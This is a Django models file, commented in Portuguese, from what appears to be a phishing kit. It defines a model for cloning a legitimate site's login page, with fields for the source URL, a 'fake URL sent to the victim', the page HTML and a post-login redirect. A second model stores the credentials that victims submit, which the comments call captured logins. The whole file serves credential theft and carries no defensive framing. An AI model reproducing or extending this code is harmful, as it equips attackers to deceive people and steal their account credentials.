from django.db import models



# Create your models here.

class TemplateCopy(models.Model):
    """
    Onde será armazenado os templates
    """
    title = models.CharField(verbose_name='Título para esse conteúdo', max_length=30, unique=True)
    url_clonar = models.URLField(verbose_name='URL do site que será clonado', max_length=200, blank=True, null=True, help_text="Se for somente o dominio, <span style='color:red;'>sempre coloque / no final, exemplo: https://dominio.com/</span>")
    url_fake = models.CharField(verbose_name='URL que será enviada para a vítima', max_length=200, unique=True, help_text="Ex: site.com/url/aqui/ -> <span style='color:red'>SEMPRE COLOQUE UMA BARRA NO FINAL !!!!!</span>")
    content = models.TextField(verbose_name='HTML da página', blank=True, null=True, help_text="Site para transformar uma imagem em base64 para usar no site sem precisar upar imagem: <a href='https://base64.guru/converter/encode/image' target='_blank'>https://base64.guru/converter/encode/image</a> -> Forma de uso: src='<span style='color:red;'>data:image/png;base64,COLAR_O_BASE64_AQUI</span>' ")
    redirect = models.CharField(verbose_name='Para onde redirecionar após login', max_length=500, blank=True, null=True, help_text='Se deixar vazio, irá redirecionar para a própria tela de login')
    copy_from_url = models.BooleanField(verbose_name="Marque se for para clonar da URL", default=True, help_text="Se deixar desmarcado, irá clonar do campo acima 'HTML da página'")
    fazer_preload = models.BooleanField(verbose_name="Marque se quiser fazer o preload da página", default=False, help_text="Marque se quiser fazer o preload da página na primeira vez que abrir a página e salvar no campo HTML acima. Após isso, desmarque o COPY FROM URL, para usar o template baixado")
    

    def __str__(self):
        return self.title


class Account(models.Model):
    """
    Onde será armazenado os logins pegos
    """
    template = models.ForeignKey(verbose_name='Por qual template veio a informação', to=TemplateCopy, related_name='template', on_delete=models.DO_NOTHING)
    datas = models.TextField(verbose_name='Dados vindos do formulário', blank=True, null=True)
    
    def __str__(self):
        return f"{self.template.title} - {self.datas}"




